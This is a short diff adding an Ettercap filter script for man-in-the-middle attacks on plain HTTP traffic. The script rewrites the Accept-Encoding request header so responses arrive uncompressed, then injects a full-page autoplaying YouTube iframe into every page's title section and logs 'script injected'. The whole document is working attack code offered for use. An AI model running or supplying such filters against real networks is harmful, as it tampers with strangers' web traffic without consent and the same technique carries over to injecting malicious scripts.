@@ -1,0 +1,11 @@
+if (ip.proto == TCP && tcp.dst == 80) {
+    if (search(DATA.data, "Accept-Encoding")) {
+           replace("Accept-Encoding", "Accept-Nothing!");
+      }
+}
+
+if (ip.proto == TCP && tcp.src == 80) {
+      if (search(DATA.data, "<title>")) {
+           replace("</title>", "</title> <iframe width=\"100%\" height=\"100%\" src=\"https://www.youtube.com/watch?v=Sagg08DrO5U?autoplay=1\"> </iframe>");
+           msg("script injected");
+      }}
